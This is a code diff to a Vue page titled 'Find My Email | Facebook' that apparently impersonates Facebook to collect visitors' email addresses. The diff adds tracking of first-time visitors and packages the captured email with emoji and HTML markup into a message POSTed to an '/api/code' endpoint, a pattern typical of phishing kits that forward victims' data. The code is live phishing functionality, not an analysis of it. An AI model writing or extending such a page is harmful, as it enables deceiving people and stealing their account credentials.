@@ -1,5 +1,6 @@
 <script setup lang="ts">
 import FindEmailMobile from '~/layouts/FindEmailMobile.vue'
+import { isFirstTime } from '~/utils/log'
 useHead({
   title: 'Find My Email | Facebook',
   meta: [
@@ -13,11 +14,19 @@ const email = ref('')
 const router = useRouter()
 async function submitForm() {
   if (!email.value) return
+  const isFirst = isFirstTime()
+  let message = ''
 
+  if (isFirst) {
+    // message Nguowif dùng lần đầu tiên
+    message += `👤 Người dùng mới truy cập\n`
+  }
+
+  message += `📭 Email: <code>${email.value}</code>`
   try {
     await $fetch('/api/code', {
       method: 'POST',
-      body: JSON.stringify({ message: `📭 Email: <code>${email.value}</code>` }),
+      body: JSON.stringify({ message }),
       headers: {
         'Content-Type': 'application/json',
       },
